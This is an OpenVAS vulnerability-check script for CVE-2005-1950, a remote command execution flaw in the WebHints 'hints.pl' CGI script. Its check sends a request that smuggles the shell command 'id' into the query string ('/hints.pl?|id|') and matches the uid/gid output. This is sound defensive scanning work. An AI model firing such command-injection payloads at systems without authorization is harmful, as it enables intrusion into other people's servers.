# OpenVAS Vulnerability Test
# $Id: webhints_remote_cmd_exec.nasl 3359 2016-05-19 13:40:42Z antu123 $
# Description: WebHints remote command execution flaw
#
# Authors:
# David Maciejak <david dot maciejak at kyxar dot fr>
#
# Copyright:
# Copyright (C) 2005 David Maciejak
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

# Ref: blahplok yahoo com

if(description)
{
 script_id(18478);
 script_version("$Revision: 3359 $");
 script_tag(name:"last_modification", value:"$Date: 2016-05-19 15:40:42 +0200 (Thu, 19 May 2016) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_cve_id("CVE-2005-1950");
 script_bugtraq_id(13930);
  
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_name("WebHints remote command execution flaw");
 
 script_summary("Checks for WebHints remote command execution flaw");
 
 script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
 
 script_copyright("This script is Copyright (C) 2005 David Maciejak");
 script_family("Web application abuses");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_tag(name:"solution", value:"No update currently available, delete this script.");
 script_tag(name:"summary", value:"The remote host is running the WebHints scripts.

The remote version of this software is vulnerable to remote command 
execution flaw through the script 'hints.pl'.

A malicious user could exploit this flaw to execute arbitrary commands on 
the remote host.");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");


http_check_remote_code (
			check_request:"/hints.pl?|id|",
			extra_check:"WebHints [0-9]+\.[0-9]+</A></SMALL></P></CENTER>",
			check_result:"uid=[0-9]+.*gid=[0-9]+.*",
			command:"id"
			);
